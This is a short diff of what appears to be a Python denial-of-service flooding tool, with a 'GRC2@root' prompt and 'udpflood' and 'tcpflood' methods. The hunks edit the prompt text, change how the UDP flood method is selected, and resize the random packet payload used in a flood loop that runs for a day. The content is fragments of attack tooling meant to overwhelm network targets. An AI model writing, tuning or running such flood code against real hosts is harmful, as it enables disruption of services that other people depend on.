@@ -44,11 +44,11 @@ method = str(input("~GRC2@root Enter METHOD :"))
 
 os.system("clear")
 
-run = int(input("[ ? ] Runner : "))
+run = int(input("~GRC2@root Runner(Only Layer7) : "))
 
 expiration_date = datetime.datetime.now() + datetime.timedelta(days=1)
 
-if method == "!udpflood":
+if method == "udpflood":
 
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
@@ -152,7 +152,7 @@ if method == "tcpflood":
 
     def tcpfl():
 
-        grtools = random._urandom(70404)
+        grtools = random._urandom(20219)
 
         while datetime.datetime.now() < expiration_date:
 
